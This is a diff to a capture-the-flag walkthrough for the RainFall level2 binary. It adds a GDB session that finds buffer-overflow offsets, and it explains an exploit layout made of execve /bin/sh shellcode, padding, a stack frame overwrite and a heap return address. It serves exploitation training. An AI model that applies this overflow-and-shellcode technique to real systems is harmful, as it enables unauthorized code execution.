@@ -114,7 +114,7 @@ With this knowledge, we crafted an exploit with:
 
 1. Shellcode to spawn a shell
 2. Padding to fill the buffer
-3. A value to overwrite the saved EBP
+3. A value to overwrite the 4 bytes of the stack frame (can be arbitrary)
 4. The heap address (0x804a008) to overwrite the return address
 
 ### Retrieving the Shellcode
@@ -129,33 +129,43 @@ We searched for "Linux/x86 - execve /bin/sh" on Shell-Storm and found [a compact
 
 This shellcode spawns a shell by invoking the `execve` system call with `/bin/sh` as the argument.
 
-### Why We Need to Handle EBP
+### Finding the Exact Overflow Offsets
 
-In level2, the saved EBP (Extended Base Pointer) is located between the buffer and the return address. This is different from level1, where the buffer is directly followed by the return address. We don't need to know what the EBP is for the purpose of this level, just that it occupies 4 bytes that must be accounted for in our exploit.
+To verify the exact buffer layout and required offsets, we created a test pattern with different character sequences:
 
-#### Key Difference Between Level1 and Level2
+```bash
+level2@RainFall:~$ python -c 'print("A"*76 + "B"*4 + "C"*4 + "D"*4)' > /tmp/test2
+level2@RainFall:~$ gdb -q ./level2 
 
-- **Level1**:
+(gdb) run < /tmp/test2
+Breakpoint 1, 0x0804853e in p () # Breakpoint at the return instruction
+(gdb) x/s $eax
+0x804a008:       'A' <repeats 64 times>, "CCCCAAAAAAAABBBBCCCCDDDD"
+(gdb) info frame
+Stack level 0, frame at 0xbffff630:
+ eip = 0x804853e in p; saved eip 0x43434343
+ called by frame at 0xbffff634
+ Arglist at 0x42424242, args: 
+ Locals at 0x42424242, Previous frame's sp is 0xbffff630
+ Saved registers:
+  eip at 0xbffff62c
+```
 
-  ```assembly
-  0x08048489 <+9>:     lea    0x10(%esp),%eax  # Buffer is allocated relative to ESP
-  ```
+This GDB session confirms several critical pieces of information:
 
-  In level1, the buffer is allocated relative to ESP (Stack Pointer), and there is no saved EBP between the buffer and the return address.
+1. The saved return address (EIP) is `0x43434343`, which is "CCCC" in ASCII
+2. The stack frame data is shown as `0x42424242`, which is "BBBB" in ASCII
+3. The heap address where our input is copied is consistently `0x804a008`
+4. The buffer overflow occurs exactly as expected:
+   - First 76 bytes fill the buffer
+   - Next 4 bytes overwrite stack frame data
+   - Next 4 bytes overwrite the return address
 
-- **Level2**:
-  ```assembly
-  0x080484e7 <+19>:    lea    -0x4c(%ebp),%eax  # Buffer is allocated relative to EBP
-  ```
-  In level2, the buffer is allocated relative to EBP, and the saved EBP occupies 4 bytes between the buffer and the return address.
-
-#### Exploit Adjustment
-
-To craft the exploit for level2, we need to:
-
-1. Fill the 76-byte buffer.
-2. Overwrite the 4 bytes of saved EBP with any value (e.g., "BBBB").
-3. Overwrite the return address with the heap address where our shellcode is stored. So that in runs our shellcode when the function returns.
+This confirms the exact layout needed for our exploit:
+- Shellcode at the beginning (will be duplicated at 0x804a008)
+- Padding to fill the buffer (55 bytes after our 21-byte shellcode)
+- 4 bytes to overwrite stack frame data (can be any value)
+- 4 bytes to overwrite the return address with 0x804a008 (heap address)
 
 ## The Final Exploit
 
@@ -166,8 +176,8 @@ To craft the exploit for level2, we need to:
 Breaking it down:
 
 - Shellcode (21 bytes): `\x6a\x0b\x58...` - Spawns /bin/sh
-- Padding (55 bytes): `"A"*45` - Fills the remainder of the 76-byte buffer
-- EBP overwrite (4 bytes): `"BBBB"` - Arbitrary value for the saved EBP
+- Padding (55 bytes): `"A"*55` - Fills the remainder of the 76-byte buffer
+- EBP overwrite (4 bytes): `"BBBB"` - Arbitrary value for the stack frame data
 - Return address (4 bytes): `\x08\xa0\x04\x08` - 0x804a008 in little-endian format. Check level1's walkthrough for more details about little-endian.
 - `cat` - Keeps stdin open for shell interaction. Check level1's walkthrough for more details.
 
